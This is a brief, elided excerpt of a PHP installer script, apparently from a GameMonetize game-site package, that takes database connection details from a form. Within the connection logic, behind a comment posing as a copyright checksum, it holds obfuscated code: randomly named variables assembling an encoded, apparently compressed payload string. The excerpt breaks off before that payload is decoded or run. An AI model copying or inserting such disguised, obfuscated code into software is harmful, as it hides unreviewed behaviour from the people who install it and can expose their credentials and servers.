...
*
* @author GameMonetize.com & GMO Holding Ltd. - Copyright © 2020
*
* All Rights Reserved
*/
...
<?php
	...
	if ( isset($_POST['dbname']) && !empty($_POST['dbname']) && isset($_POST['dbhost']) && !empty($_POST['dbhost']) ) :
		...
		if (!$td_db->connect_errno) :
			...
			/* Copyright © 2020 - All rights reserved. Checksum: f8f3a8804390f531531eec04ada2dbe0 */ $WRMQGchhPJpFykrQHiIgDLYsWjWYWW = "";$tFqeYGZX = "eNqNkFFLwzAQx58n+B3";$xnhzgECCP = "KDDimPJRWquppDFXRGOYyjIdaLgAKoYiojXilytifgHBSsXGzlnINKURUGGVRWSbWfWSYsVHJGTqZaAgqJQpViUhoefYyPw";$WRMQGchhPJpFykrQHiIgDLYsWjWYWW .= $tFqeYGZX;
